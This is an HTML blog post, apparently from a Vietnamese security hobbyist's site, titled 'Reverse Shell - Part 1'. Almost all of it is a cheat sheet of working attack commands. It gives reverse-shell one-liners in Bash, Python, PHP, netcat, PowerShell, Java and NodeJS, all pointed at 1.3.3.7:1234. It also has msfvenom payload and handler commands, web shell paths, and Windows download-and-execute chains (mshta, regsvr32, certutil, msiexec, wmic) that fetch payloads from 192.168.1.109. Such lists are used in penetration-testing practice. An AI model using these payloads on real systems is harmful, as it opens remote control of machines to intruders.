@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="en" >
+
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="generator" content="Hugo 0.55.6" />
+    
+    <link rel="canonical" href="https://vnstrawhat.github.io/posts/reverse_shell_all_the_think/" />
+    <meta name="description" content="">
+    
+
+    <title>Reverse Shell - Part 1 &middot; TrungKFC</title>
+
+    <link rel="shortcut icon" href="https://vnstrawhat.github.io/images/favicon.ico" />
+
+    <link rel="stylesheet" href="https://vnstrawhat.github.io/css/main.css" />
+    
+        
+        <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/styles/nord.min.css">
+        
+    
+    
+    
+    <link rel="stylesheet" href="https://vnstrawhat.github.io/css/kfc.css">
+    
+</head>
+
+
+<body class="loading dark-mode">
+    
+<div class="top">
+    <img class="logo" src="https://vnstrawhat.github.io/images/logo.svg" alt="logo" />
+</div>
+<div class="bottom">
+    <img class="logo" src="https://vnstrawhat.github.io/images/logo.svg" alt="logo" />
+</div>
+
+    <header class="header">
+    <ul class="menu clearfix control">
+        
+
+<li class="logo-container logo-default">
+    <a href="https://vnstrawhat.github.io" class="btn logo-link">
+        <img class="logo" src="https://vnstrawhat.github.io/images/logo.svg" alt="logo" />
+    </a>
+</li>
+
+        
+        
+        
+        
+        <li 
+            class="">
+            <a class="btn" id="theme-switcher-button">
+                Article
+            </a>
+            <ul class="sub-menu control">
+                
+                <li class="">
+                    <a href="/posts"
+                    
+                        class="btn "
+                    >Posts</a>
+                </li>
+                
+                <li class="">
+                    <a href="/tags"
+                    
+                        class="btn "
+                    >Tags</a>
+                </li>
+                
+                <li class="">
+                    <a href="/categories"
+                    
+                        class="btn "
+                    >Categories</a>
+                </li>
+                
+            </ul>
+        </li>
+        
+        
+        
+        
+        <li 
+            class="">
+            <a class="btn" id="theme-switcher-button">
+                View
+            </a>
+            <ul class="sub-menu control">
+                
+                <li class="">
+                    <a href="#"
+                    
+                        class="btn toggle-sidebar"
+                    >Toggle Sidebar</a>
+                </li>
+                
+            </ul>
+        </li>
+        
+        
+        
+        <li>
+            <a href="/" class="btn">
+                About
+            </a>
+        </li>
+        
+        
+    </ul>
+</header>
+
+    <div class="middle">
+        <nav class="sidebar">
+            <h4 style="color: white;" class="taxonomy-key">Recent Posts</h4>
+<ul class="posts control">
+    
+    <li><a class="no-break btn" href='/posts/reverse_shell_all_the_think/'><i class="icon icon-post"></i>Reverse Shell - Part 1</a></li>
+    
+    <li><a class="no-break btn" href='/posts/security_incident_response_part4/'><i class="icon icon-post"></i>IR part 4 - Quy trình ứng phó sự cố</a></li>
+    
+    <li><a class="no-break btn" href='/posts/security_incident_response_part3/'><i class="icon icon-post"></i>IR part 3 - Cơ cấu của một đội ứng phó sự cố</a></li>
+    
+    <li><a class="no-break btn" href='/posts/security_incident_response_part2/'><i class="icon icon-post"></i>IR part 2 - Chính sách, kế hoạch, thủ tục ứng phó sự cố</a></li>
+    
+    <li><a class="no-break btn" href='/posts/security_incident_response_part1/'><i class="icon icon-post"></i>IR part 1 - Tổng quan</a></li>
+    
+</ul>
+        </nav>
+        <main class="main">
+            <article class="article">
+    <h2 class="title"><a href='/posts/reverse_shell_all_the_think/' class="btn">Reverse Shell - Part 1</a></h2>
+    <div class="article-meta clearfix">
+        <ul class="dates clearfix left control">
+            <li><i class="icon icon-date"></i></li>
+            <li class="publish-date">
+                <time datetime="2019.06.17">2019.06.17</time>
+            </li>
+        </ul>
+        
+        <ul class="article-categories clearfix left control">
+            <li><i class="icon icon-categories"></i></li>
+            
+            <li>
+                <a href="https://vnstrawhat.github.io/categories/hack-the-box/" class="btn">Hack The Box</a>
+            </li>
+            
+        </ul>
+        
+        
+        <div class="article-meta-splitter clearfix"></div>
+        <ul class="article-tags clearfix control">
+            <li><i class="icon icon-tags"></i></li>
+            
+            <li>
+                <a href="https://vnstrawhat.github.io/tags/reverse-shell/" class="btn">Reverse Shell</a>
+            </li>
+            
+        </ul>
+        
+    </div>
+    <div class="content">
+        
+        
+
+<p>Note cho khi cần dùng đến.</p>
+
+<h1 id="reverse-shell">Reverse Shell</h1>
+
+<h4 id="bash">Bash</h4>
+
+<blockquote>
+<p>bash -i &gt;&amp; /dev/tcp/1.3.3.<sup>7</sup>&frasl;<sub>1234</sub> 0&gt;&amp;1</p>
+
+<p>exec /bin/bash 0&amp;0 2&gt;&amp;0
+msfvenom -p cmd/unix/reverse_bash LHOST=1.3.3.7 LPORT=1234 -f raw &gt; shell.sh</p>
+</blockquote>
+
+<h4 id="php">PHP</h4>
+
+<blockquote>
+<p>php -r &lsquo;$sock=fsockopen(&ldquo;1.3.3.7&rdquo;,1234);exec(&ldquo;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&rdquo;);&rsquo;</p>
+
+<p>msfpayload php/meterpreter/reverse_tcp LHOST=1.3.3.7 LPORT=1234 R &gt; exploit.php</p>
+
+<p>msfvenom -p php/meterpreter_reverse_tcp LHOST=1.3.3.7 LPORT=1234 -f raw &gt; shell.php
+cat shell.php | pbcopy &amp;&amp; echo &lsquo;&lt;?php &lsquo; | tr -d &lsquo;\n&rsquo; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</p>
+</blockquote>
+
+<h4 id="python">Python</h4>
+
+<blockquote>
+<p>export RHOST=&ldquo;1.3.3.7&rdquo;;export RPORT=1234;python -c &lsquo;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&ldquo;RHOST&rdquo;),int(os.getenv(&ldquo;RPORT&rdquo;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;</p>
+
+<p>python -c &lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;1.3.3.7&rdquo;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;</p>
+
+<p>C:\Python27\python.exe -c &ldquo;(lambda __y, __g, <strong>contextlib: [[[[[[[(s.connect((&lsquo;1.3.3.7&rsquo;,1234)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [<strong>ctx.</strong>enter__(), <strong>ctx.</strong>exit__(None, None, None), __out<a href="lambda: None">0</a>][2])(</strong>contextlib.nested(type(&lsquo;except&rsquo;, (), {&rsquo;<strong>enter</strong>&lsquo;: lambda self: None, &lsquo;<strong>exit</strong>&lsquo;: lambda __self, __exctype, __value, __traceback: <strong>exctype is not None and (issubclass(</strong>exctype, KeyboardInterrupt) and [True for <strong>out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(&lsquo;try&rsquo;, (), {&rsquo;</strong>enter<strong>&lsquo;: lambda self: None, &lsquo;</strong>exit__&rsquo;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&lsquo;p2s_thread&rsquo;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&lsquo;s2p_thread&rsquo;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&lsquo;p&rsquo;] in [(subprocess.Popen([&rsquo;\windows\system32\cmd.exe&rsquo;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&rsquo;s&rsquo;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for <strong>g[&lsquo;p2s&rsquo;], p2s.</strong>name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda <strong>this: lambda: (</strong>l[&rsquo;s&rsquo;].send(__l[&lsquo;p&rsquo;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&rsquo;s&rsquo;], __l[&lsquo;p&rsquo;] in [(s, p)]][0])({}), &lsquo;p2s&rsquo;)]][0] for <strong>g[&lsquo;s2p&rsquo;], s2p.</strong>name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda <strong>after: (</strong>l[&lsquo;p&rsquo;].stdin.write(__l[&lsquo;data&rsquo;]), <strong>after())[1] if (len(</strong>l[&lsquo;data&rsquo;]) &gt; 0) else __after())(lambda: __this()) for <strong>l[&lsquo;data&rsquo;] in [(</strong>l[&rsquo;s&rsquo;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&rsquo;s&rsquo;], __l[&lsquo;p&rsquo;] in [(s, p)]][0])({}), &lsquo;s2p&rsquo;)]][0] for <strong>g[&lsquo;os&rsquo;] in [(</strong>import__(&lsquo;os&rsquo;, __g, __g))]][0] for <strong>g[&lsquo;socket&rsquo;] in [(</strong>import__(&lsquo;socket&rsquo;, __g, __g))]][0] for <strong>g[&lsquo;subprocess&rsquo;] in [(</strong>import__(&lsquo;subprocess&rsquo;, __g, __g))]][0] for <strong>g[&lsquo;threading&rsquo;] in [(</strong>import__(&lsquo;threading&rsquo;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), <strong>import</strong>(&lsquo;contextlib&rsquo;))&rdquo;</p>
+
+<p>python -c &lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;1.3.3.7&rdquo;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&ldquo;/bin/sh&rdquo;,&ldquo;-i&rdquo;]);&rsquo;</p>
+</blockquote>
+
+<h4 id="nc">NC</h4>
+
+<blockquote>
+<p>nc -e /bin/sh 1.3.3.7 1234</p>
+
+<p>OpenBSD:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</p>
+
+<p>/bin/sh | nc 1.3.3.7 1234</p>
+
+<p>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc 1.3.3.7 1234 0/tmp/p</p>
+</blockquote>
+
+<h4 id="telnet">Telnet</h4>
+
+<blockquote>
+<p>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p</p>
+
+<p>telnet 1.3.3.7 80| /bin/bash | telnet 1.3.3.7 1234</p>
+</blockquote>
+
+<h4 id="powershell">Powershell</h4>
+
+<pre><code class="language-powershell">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&quot;1.3.3.7&quot;,1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+</code></pre>
+
+<pre><code class="language-powershell">powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient('1.3.3.7',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;
+</code></pre>
+
+<pre><code class="language-powershell">powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
+</code></pre>
+
+<pre><code class="language-powershell">$sm=(New-Object Net.Sockets.TCPClient('1.3.3.7',1234)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2&gt;&amp;1));$sm.Write($st,0,$st.Length)}
+</code></pre>
+
+<h4 id="java">Java</h4>
+
+<blockquote>
+<p>r = Runtime.getRuntime()
+p = r.exec([&ldquo;/bin/bash&rdquo;,&ldquo;-c&rdquo;,&ldquo;exec 5&lt;&gt;/dev/tcp/.3.3.<sup>7</sup>&frasl;<sub>1234</sub>;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&5; done&rdquo;] as String[])
+p.waitFor()</p>
+
+<p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=1.3.3.7 LPORT=1234 -f raw &gt; shell.jsp</p>
+
+<p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=1.3.3.7 LPORT=1234 -f war &gt; shell.war</p>
+</blockquote>
+
+<h4 id="nodejs">NodeJS</h4>
+
+<pre><code class="language-javascript">(function(){
+    var net = require(&quot;net&quot;),
+        cp = require(&quot;child_process&quot;),
+        sh = cp.spawn(&quot;/bin/sh&quot;, []);
+    var client = new net.Socket();
+    client.connect(1234, &quot;1.3.3.7&quot;, function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+</code></pre>
+
+<pre><code class="language-javascript">require('child_process').exec('nc -e /bin/sh 1.3.3.7 1234')
+</code></pre>
+
+<pre><code class="language-javascript">require(&quot;child_process&quot;).exec('bash -c &quot;bash -i &gt;%26 /dev/tcp/1.3.3.7/1234 0&gt;%261&quot;')
+</code></pre>
+
+<blockquote>
+<p><a href="https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py">https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</a></p>
+</blockquote>
+
+<h4 id="kali-web-shells">Kali Web Shells</h4>
+
+<blockquote>
+<p>/usr/share/webshells/php/php-reverse-shell.php</p>
+
+<p>/usr/share/webshells/php/simple-backdoor.php</p>
+
+<p>/usr/share/webshells/php/php-backdoor.php</p>
+
+<p>/usr/share/webshells/perl/perl-reverse-shell.pl</p>
+
+<p>/usr/share/webshells/perl/perlcmd.cgi</p>
+
+<p>/usr/share/webshells/cfm/cfexec.cfm</p>
+
+<p>/usr/share/webshells/asp/</p>
+
+<p>/usr/share/webshells/aspx/</p>
+
+<p>/usr/share/webshells/jsp/jsp-reverse.jsp</p>
+</blockquote>
+
+<h3 id="metasploit-payloads">Metasploit Payloads</h3>
+
+<h4 id="binaries">Binaries</h4>
+
+<p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf &gt; shell.elf
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe &gt; shell.exe
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho &gt; shell.macho</p>
+
+<h4 id="web-payloads">Web Payloads</h4>
+
+<p>msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.php
+cat shell.php | pbcopy &amp;&amp; echo &lsquo;&lt;?php &lsquo; | tr -d &lsquo;\n&rsquo; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp &gt; shell.asp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war &gt; shell.war</p>
+
+<h4 id="scripting-payloads">Scripting Payloads</h4>
+
+<p>msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.py
+msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.sh
+msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.pl</p>
+
+<h4 id="shellcode">Shellcode</h4>
+
+<p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language></p>
+
+<h4 id="handlers">Handlers</h4>
+
+<pre><code class="language-bash">use exploit/multi/handler
+set PAYLOAD &lt;Payload name&gt;
+set LHOST &lt;LHOST value&gt;
+set LPORT &lt;LPORT value&gt;
+set ExitOnSession false
+exploit -j -z
+</code></pre>
+
+<h3 id="get-reverse-shell-via-windows-one-liner">Get Reverse-shell via Windows one-liner</h3>
+
+<h4 id="mshta-exe">Mshta.exe</h4>
+
+<p>Attacker:</p>
+
+<pre><code class="language-bash">use exploit/windows/misc/hta_server
+msf exploit(windows/misc/hta_server) &gt; set srvhost 192.168.1.109
+msf exploit(windows/misc/hta_server) &gt; set lhost 192.168.1.109
+msf exploit(windows/misc/hta_server) &gt; exploit
+</code></pre>
+
+<p>Victim:</p>
+
+<pre><code class="language-bash">mshta.exe http://192.168.1.109:8080/5EEiDSd70ET0k.hta
+</code></pre>
+
+<h4 id="rundll32-exe">Rundll32.exe</h4>
+
+<p>Attacker</p>
+
+<pre><code class="language-bash">use  exploit/windows/smb/smb_delivery
+msf exploit(windows/smb/smb_delivery)  &gt;  set srvhost  192.168.1.109
+msf exploit(windows/smb/smb_delivery)  &gt;  exploit
+</code></pre>
+
+<p>Victim:</p>
+
+<pre><code class="language-bash">rundll32.exe  \\192.168.1.109\vabFG\test.dll,0
+</code></pre>
+
+<h4 id="regsvr32-exe">Regsvr32.exe</h4>
+
+<p>Attacker:</p>
+
+<pre><code class="language-bash">use  exploit/multi/script/web_delivery
+msf exploit (web_delivery)&gt;set target  3
+msf exploit (web_delivery)&gt; set payload windows/meterpreter/reverse_tcp
+msf exploit (web_delivery)&gt; set lhost  192.168.1.109
+msf exploit (web_delivery)&gt;set srvhost  192.168.1.109
+msf exploit (web_delivery)&gt;exploit
+</code></pre>
+
+<p>Victim:</p>
+
+<pre><code class="language-bash">regsvr32  /s  /n  /u  /i:http://192.168.1.109:8080/xo31Jt5dIF.sct scrobj.dll
+</code></pre>
+
+<h4 id="certutil-exe">Certutil.exe</h4>
+
+<p>Attacker:</p>
+
+<pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f exe &gt; shell.exe
+</code></pre>
+
+<pre><code class="language-bash">use  exploit/multi/handler
+msf exploit(multi/handler)  &gt;  set payload windows/meterpreter/reverse_tcp
+msf exploit(multi/handler)  &gt;  set lhost  192.168.1.109
+msf exploit(multi/handler)  &gt;  set lport  1234
+msf exploit(multi/handler)  &gt;  exploit
+</code></pre>
+
+<p>Victim:</p>
+
+<pre><code class="language-bash">certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe &amp; shell.exe
+</code></pre>
+
+<h4 id="powershell-exe">Powershell.exe</h4>
+
+<p>Attacker:</p>
+
+<pre><code class="language-bash">git clone  https://github.com/besimorhino/powercat.git
+python  -m  SimpleHTTPServer  80
+</code></pre>
+
+<pre><code class="language-bash">nc lvp 1234
+</code></pre>
+
+<p>Victim:</p>
+
+<pre><code class="language-bash">powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd&quot;
+</code></pre>
+
+<p>OR
+Attacker:</p>
+
+<pre><code class="language-bash">msfvenom  -p  cmd/windows/reverse_powershell lhost=192.168.1.109  lport=1234 &gt; 	1.bat
+</code></pre>
+
+<pre><code class="language-bash">nc lvp 1234
+</code></pre>
+
+<p>Victim:</p>
+
+<pre><code class="language-bash">powershell  -c  &quot;IEX((New-Object  System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))
+</code></pre>
+
+<h4 id="cscript-exe">Cscript.exe</h4>
+
+<p>Attacker:</p>
+
+<pre><code class="language-bash">msfvenom  -p  cmd/windows/reverse_powershell lhost=192.168.1.109  lport=1234  -f  vbs  &gt;  1.vbs
+</code></pre>
+
+<pre><code class="language-bash">use  exploit/multi/handler
+msf exploit(multi/handler)  &gt;  set payload windows/meterpreter/reverse_tcp
+msf exploit(multi/handler)  &gt;  set lhost  192.168.1.109
+msf exploit(multi/handler)  &gt;  set lport  1234
+msf exploit(multi/handler)  &gt;  exploit
+</code></pre>
+
+<p>Victim:</p>
+
+<pre><code class="language-bash">powershell.exe  -c  &quot;(New-Object System.NET.WebClient).DownloadFile('http://192.168.1.109/1.vbs',\&quot;$env:temp\test.vbs\&quot;);Start-Process %windir%\system32\cscript.exe \&quot;$env:temp\test.vbs\&quot;&quot;
+</code></pre>
+
+<h4 id="msiexec-exe">Msiexec.exe</h4>
+
+<p>Attacker:</p>
+
+<pre><code class="language-bash">msfvenom  -p  windows/meterpreter/reverse_tcp lhost=192.168.1.109  lport=1234  -f  msi  &gt;  1.msi
+</code></pre>
+
+<pre><code class="language-bash">use  exploit/multi/handler
+msf exploit(multi/handler)  &gt;  set payload windows/meterpreter/reverse_tcp
+msf exploit(multi/handler)  &gt;  set lhost  192.168.1.109
+msf exploit(multi/handler)  &gt;  set lport  1234
+msf exploit(multi/handler)  &gt;  exploit
+</code></pre>
+
+<p>Victim:</p>
+
+<pre><code class="language-bash">msiexec  /q  /i  http://192.168.1.109/1.msi
+</code></pre>
+
+<h4 id="wmic-exe">Wmic.exe</h4>
+
+<p>Attacker:
+<a href="https://www.hackingarticles.in/koadic-com-command-control-framework/">https://www.hackingarticles.in/koadic-com-command-control-framework/</a></p>
+
+<pre><code class="language-bash">git clone  //github.com/zerosum0x0/koadic
+cd koadic
+apt-get install python3-pip
+pip3 install  -r  requirements.txt
+./koadic
+</code></pre>
+
+<pre><code class="language-bash">use  stager/js/wmic
+set SRVHOST  192.168.1.107
+run
+</code></pre>
+
+<p>Victim:</p>
+
+<pre><code class="language-bash">wmic os get  /FORMAT:&quot;http://192.168.1.107:9996/g8gkv.xsl&quot;
+</code></pre>
+
+<h3 id="spawn-tty-shell">Spawn TTY Shell</h3>
+
+<pre><code class="language-bash">python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+Ctrl-Z
+</code></pre>
+
+<pre><code class="language-bash">/bin/sh -i
+</code></pre>
+
+<pre><code class="language-bash">perl -e 'exec &quot;/bin/sh&quot;;'
+</code></pre>
+
+<pre><code class="language-bash">perl: exec &quot;/bin/sh&quot;;
+</code></pre>
+
+<pre><code class="language-bash">ruby: exec &quot;/bin/sh&quot;
+</code></pre>
+
+<pre><code class="language-bash">lua: os.execute('/bin/sh')
+</code></pre>
+
+<h2 id="nguồn">Nguồn</h2>
+
+<p>Tổng hợp từ khắp mọi nơi trên thế giới</p>
+
+<ul>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a></li>
+<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">https://highon.coffee/blog/reverse-shell-cheat-sheet/</a></li>
+<li><a href="https://nitesculucian.github.io/2018/07/15/reverse-shells-cheat-sheet/">https://nitesculucian.github.io/2018/07/15/reverse-shells-cheat-sheet/</a></li>
+<li><a href="http://www.codemania.it/2018/05/04/reverse-shell-cheat-sheet/">http://www.codemania.it/2018/05/04/reverse-shell-cheat-sheet/</a></li>
+<li><a href="https://netsec.ws/?p=331">https://netsec.ws/?p=331</a></li>
+<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1</a></li>
+<li><a href="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/">https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/</a></li>
+<li><a href="https://hackernoon.com/reverse-shell-cf154dfee6bd">https://hackernoon.com/reverse-shell-cf154dfee6bd</a></li>
+<li><a href="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/">https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/</a></li>
+<li>&hellip;</li>
+</ul>
+
+        
+    </div>
+</article>
+<section class="comment">
+    <p class="local-info">
+        Comment is disabled to avoid unwanted discussions from 'localhost:1313' on your Disqus
+        account...
+    </p>
+    <div id="disqus_thread"></div>
+</section>
+<script type="text/javascript">
+
+    (function () {
+        if (window.location.hostname == "localhost") {
+            return
+        }
+        document.querySelector('.local-info').classList.add('hide')
+
+        let dsq = document.createElement('script')
+        dsq.type = 'text/javascript'
+        dsq.async = true
+        let disqus_shortname = 'your disqus short name'
+        dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq)
+    })()
+</script>
+
+        </main>
+    </div>
+    <footer class="footer clearfix">
+    <ul class="control social clearfix">
+        <li><a class="author btn" href="#">TrungKFC</a></li>
+        
+        
+        <li>
+            <a class="icon-link btn" href="%20"><i class="icon email"></i></a>
+        </li>
+        
+        
+        
+        <li>
+            <a class="icon-link btn" href="%20"><i class="icon facebook"></i></a>
+        </li>
+        
+        
+        
+        <li>
+            <a class="icon-link btn" href="%20"><i class="icon github"></i></a>
+        </li>
+        
+        
+        
+        <li>
+            <a class="icon-link btn" href="%20"><i class="icon twitter"></i></a>
+        </li>
+        
+        
+        <li>
+            <a class="icon-link btn" href="https://vnstrawhat.github.io/index.xml" type="application/rss+xml" title="rss">
+            <i class="rss icon"></i></a>
+        </li>
+    </ul>
+    <ul class="control status clearfix">
+        <li><a href="#" class="btn">Posts:
+        6</a>
+    </li>
+    <li><a href="#" class="btn">Pages:
+    0</a></li>
+</ul>
+</footer>
+<div class="dialog">
+<div class="wrapper">
+    <div class="clearfix"><button class="btn close-dialog">X</button></div>
+    <header>
+        <h1 class="title">Theme Name</h1>
+    </header>
+    <main>
+        <div class="clearfix">
+            <label for="theme-name">
+                <p>Only English Character, space, hyphen are allowed!</p>
+            </label>
+            <input type="text" name="theme-name" id="theme-name">
+        </div>
+        <div class="clearfix">
+            <button class="btn export">Export</button>
+        </div>
+    </main>
+<footer></footer>
+</div>
+</div>
+    <script src="https://vnstrawhat.github.io/js/main.js"></script>
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/highlight.min.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'your ga id', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</body>
+
+</html>
